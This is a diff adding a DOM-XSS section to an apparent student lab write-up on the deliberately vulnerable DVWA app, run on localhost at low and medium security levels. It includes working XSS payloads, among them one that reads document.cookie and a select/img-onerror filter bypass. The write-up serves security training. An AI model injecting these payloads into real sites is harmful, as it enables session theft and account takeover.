@@ -222,4 +222,89 @@ Since `'1'='1'` is always true, this query will return information for all users
 ---
 
 
-# XSS (Cross site scripting)
+# DOM-XSS (Cross site scripting)
+
+<img width="882" alt="Untitled (4)" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/205e04f0-1cd6-4bf9-aafc-83c673981a5a">
+
+<details>
+    
+<summary>low-level security</summary>
+
+### DVWA XSS - Low level 
+
+1. **The URL**:
+    
+    ```php
+    // original URL
+    127.0.0.1/dvwa/vulunerabilities/xss-d/
+    
+    // after selecting language
+    127.0.0.1/dvwa/vulunerabilities/xss-d/default=English
+    ```
+    
+2. **Testing with inserting javascript into URL**:
+    
+    ```jsx
+    <script> alert(”XSS_Test”) </script>
+    ```
+    
+3. **Updated URL:**
+    
+    ```jsx
+    127.0.0.1/dvwa/vulunerabilities/xss-d/default=English <script> alert(”XSS_Test”) </script>
+    ```
+    
+4. **Vulnerabilities Found**:
+    
+    <img width="1184" alt="Screenshot 2024-05-17 at 12 47 02 in the afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/93b9ddac-f9f8-4dd4-81fd-7922afece9d6">
+
+    
+5. **Vulnerabilities Exploitation**:
+    - **The vulnerable script:** `<script> alert(document.cookie) </script>`
+      
+        <img width="1294" alt="Screenshot 2024-05-17 at 12 49 37 in the afternoon" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/1f7e5ed5-160c-45ac-aa03-bf20c7d3cbc9">
+
+          
+</details>
+
+---
+
+<details>
+
+<summary> medium-level security </summary>
+
+### DVWA XSS - Medium level
+
+1. **The URL**:
+    
+    ```php
+    // original URL
+    127.0.0.1/dvwa/vulunerabilities/xss-d/
+    
+    // after selecting language
+    127.0.0.1/dvwa/vulunerabilities/xss-d/default=English
+    ```
+    
+2. **Testing with inserting javascript into URL**:
+    
+    ```jsx
+    <script> alert(”XSS_Test”) </script>
+    
+    // failed because it has filtering script.
+    ```
+    
+3. **Try with:**
+    
+    ```jsx
+    </select><img src/onerror=alert(”XSS_Test”)>
+    ```
+    
+4. **Vulnerabilities Found**:
+   
+    <img width="1344" alt="Untitled (5)" src="https://github.com/MuninMunin/SDS---DVWA/assets/151008791/3cf4b170-a7e0-466e-b613-a3631cefee7a">
+
+    
+ </details>
+ 
+---
+
